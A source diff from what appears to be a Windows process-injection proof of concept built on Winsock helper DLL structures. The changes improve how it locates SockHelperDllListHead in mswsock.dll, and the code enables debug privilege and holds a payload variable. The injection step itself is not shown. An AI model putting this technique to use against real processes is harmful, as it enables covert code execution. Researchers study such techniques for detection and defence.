@@ -85,6 +85,8 @@ BOOL IsHeapPtr(LPVOID ptr) {
     MEMORY_BASIC_INFORMATION mbi;
     DWORD                    res;
     
+    if(ptr == NULL) return FALSE;
+    
     // query the pointer
     res = VirtualQuery(ptr, &mbi, sizeof(mbi));
     if(res != sizeof(mbi)) return FALSE;
@@ -92,6 +94,22 @@ BOOL IsHeapPtr(LPVOID ptr) {
     return ((mbi.State   == MEM_COMMIT    ) &&
             (mbi.Type    == MEM_PRIVATE   ) && 
             (mbi.Protect == PAGE_READWRITE));
+}
+
+// returns TRUE if ptr is RX code
+BOOL IsCodePtr(LPVOID ptr) {
+    MEMORY_BASIC_INFORMATION mbi;
+    DWORD                    res;
+    
+    if(ptr == NULL) return FALSE;
+    
+    // query the pointer
+    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
+    if(res != sizeof(mbi)) return FALSE;
+
+    return ((mbi.State   == MEM_COMMIT    ) &&
+            (mbi.Type    == MEM_IMAGE     ) && 
+            (mbi.Protect == PAGE_EXECUTE_READ));
 }
 
 // calculate the RVA of Socket Helpder DLL LIST_ENTRY in MSWSOCK data section
@@ -110,12 +128,11 @@ DWORD GetSockHelperDllListHeadRVA(VOID) {
     // by creating a socket for AF_INET, 
     // this loads mswsock.dll and initializes SockHelperDllListHead
     WSAStartup(MAKEWORD(2, 0), &wsa);
-    s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     closesocket(s);
     
-    // get the base of image
-    m = GetModuleHandle(L"mswsock");
-
+    m = GetModuleHandle(L"mswsock.dll");
+    
     dos = (PIMAGE_DOS_HEADER)m;  
     nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
     sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
@@ -143,11 +160,15 @@ DWORD GetSockHelperDllListHeadRVA(VOID) {
         
         // assume it's a winsock helpder dll info structure
         hdi = (PWINSOCK_HELPER_DLL_INFO)list->Flink;
-        // if two api match 
-        if(hdi->WSHOpenSocket  == (LPVOID)GetProcAddress(m, "Tcpip4_WSHOpenSocket") &&
-          hdi->WSHOpenSocket2 == (LPVOID)GetProcAddress(m, "Tcpip4_WSHOpenSocket2")) {
-          // return the RVA
-          rva = sh[i].VirtualAddress + j * sizeof(ULONG_PTR);
+        
+        // check if heap/code pointers
+        if(IsHeapPtr(hdi->Mapping)        &&
+           IsCodePtr(hdi->WSHOpenSocket)  && 
+           IsCodePtr(hdi->WSHOpenSocket2) &&
+           IsCodePtr(hdi->WSHIoctl)) {
+           // return the RVA
+           rva = sh[i].VirtualAddress + j * sizeof(ULONG_PTR);
+           break;
         }
       }
     }
@@ -333,7 +354,7 @@ VOID ListWSHX(DWORD pid) {
     
     // get the rva of SockHelperDllListHead
     rva = GetSockHelperDllListHeadRVA();
-    
+
     if(rva == 0) {
       printf("Unable to obtain RVA for SockHelperDllListHead.\n");
       return;
@@ -380,7 +401,7 @@ VOID ListWSHX(DWORD pid) {
       printf("MaxSockaddrLength       : %i\n",   hdi.MaxSockaddrLength);
       printf("MinTdiAddressLength     : %i\n",   hdi.MinTdiAddressLength);
       printf("MaxTdiAddressLength     : %i\n",   hdi.MaxTdiAddressLength);
-      printf("UseDelayedAcceptance    : %lx\n", hdi.UseDelayedAcceptance);
+      printf("UseDelayedAcceptance    : %llX\n", hdi.UseDelayedAcceptance);
       printf("Mapping                 : %p\n",   (LPVOID)hdi.Mapping);
       
       if(StringFromGUID2(&hdi.ProviderGUID, guid, MAX_PATH)) {
@@ -634,14 +655,15 @@ DWORD _RtlGetVersion(void) {
     return ver;
 }
 
-int wmain(int argc, WCHAR *argv[]) {
+int main(void) {
     DWORD         i, j, len, cnt, pid = 0, port = 0;
     WSHINFO       wsh;
     LPVOID        payload;
-    
+    int           argc;
+	wchar_t       **argv;
+	
     if(_RtlGetVersion() != 10) {
       printf("\nWARNING: PoC only tested on Windows 10!\n");
-      return 0;
     }
     
     memset(&wsh, 0, sizeof(wsh));
@@ -650,7 +672,9 @@ int wmain(int argc, WCHAR *argv[]) {
     if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
       printf("WARNING: could not enable debugging privilege.\n");
     }
-      
+    
+	argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+	
     // if no parameters, list all available processes
     if(argc == 1) {
       ListTransports();
